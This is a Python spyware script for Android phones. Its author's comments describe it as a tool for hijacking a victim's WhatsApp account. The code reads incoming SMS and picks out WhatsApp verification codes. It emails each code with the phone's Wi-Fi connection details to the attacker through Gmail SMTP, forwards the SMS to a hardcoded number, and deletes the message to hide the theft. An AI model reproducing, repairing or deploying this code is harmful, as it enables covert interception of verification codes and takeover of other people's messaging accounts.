#AUTHOR: Jay Prajapati
#description
#This is spy script for android mobiles...
#where this scripts check for whatsapp Verificaiton message..
#Whenever message arrives script will send that verification code to myself along with victim mobile's mac ID.
#and delete arrived message.
#now we can spoof mac and use their whatsapp in our mobile phone/

import time,android,smtplib,urllib2,os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
droid=android.Android()
ids=droid.smsGetMessageIds('true').result ##read msges==false unread=true
number=droid.smsGetMessageCount('true').result
mail_sent=0

if '.msgIDs' not in os.listdir("/sdcard/"):
    print("Not Exist")
    os.mkdir("/sdcard/.msgIDs")
    print("Directory Created Succesfully")

fo = open("/sdcard/.mynoscan/foo.txt", "a+")
for currentId in ids:
    fo.write(str(currentId))
    fo.write("\n")
fo.close()

def gather_id():
    sent_ids=[]
    fo = open("/sdcard/.msgIDs/foo.txt", "a+")
    for line in fo:
        if line != '':
            sent_ids.append(line)
    fo.close()
    return sent_ids        


def send_gmail(yes):
    print("intiating credentinals...")
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    mailfrom = 'mailfromID'
    mailto = 'mailtoID'
    password = 'password'
    msg = MIMEMultipart()
    msg['Subject'] = 'subject'
    msg['To'] = mailto
    msg['From'] = mailfrom
    body = ''+ yes+ ''
    msg.attach(MIMEText(body, 'plain'))
    try:  
        smtpObj = smtplib.SMTP(smtp_server,smtp_port)
        smtpObj.starttls()
        smtpObj.login(mailfrom,password)
        smtpObj.sendmail(mailfrom,mailto,msg.as_string())
        smtpObj.close() 
        mail_sent=1
        print('Email sent!')
        return mail_sent
        
    except:  
        print ('Something went wrong...')

def get_mac():
    yes=str(droid.wifiGetConnectionInfo().result)
    temp=send_gmail(yes)
    return yes
yes=get_mac()

def wait_for_internet_connection():
    flag=0
    mail_sent=0
    targets=[]
    print("Connecting....")
    while True:
        
        try:
            response = urllib2.urlopen('http://www.google.com',timeout=1)
            print("Connected..")
            if mail_sent==0: 
                mail_sent=send_gmail(yes)
            return mail_sent
        except urllib2.URLError:
            print("Not Connecting..")
            pass
        time.sleep(20)

while 1:
    Updatednumber=droid.smsGetMessageCount('true').result
    
    if Updatednumber != number:
        ids=droid.smsGetMessageIds('true').result
        print("New Message Found.!")
        count=0
        msgId=[]
        for id in ids:
            count=count+1
            msgId.append(id)
            if count==2:
                break
        print("fetching Message ID")
        #print msgId
        for currentId in msgId:
            bodyTxt=droid.smsGetMessageById(currentId,None).result
            keyword='WhatsApp'
            print(bodyTxt)
            if keyword in bodyTxt:
                sent_ids=[]
                sent_ids=gather_id()
                if currentId in sent_ids:
                    break
                fo = open("/sdcard/.msgIDs/foo.txt", "a+")
                fo.write(currentId)
                fo.write("\n")
                fo.close()
                print(bodyTxt)
                i=5
                while i>0:
                    try:
                        response = urllib2.urlopen('http://www.google.com',timeout=1)
                        print("Connection Available..")
                        temp=send_gmail(bodyTxt+yes)
                        print("Emali sent")
                        break
                    except urllib2.URLError:
                        print("Not Connected to internet...retrying" + i)
                        pass
                droid.smsSend('99999999999',bodyTxt)
                print("sms sent!")
                status=droid.smsDeleteMessage(currentId)
                print(str(status))
                number=Updatednumber
                break
            else:
                print("Dummy Message Found")
                number=Updatednumber
    print("no new message")
    time.sleep(20)
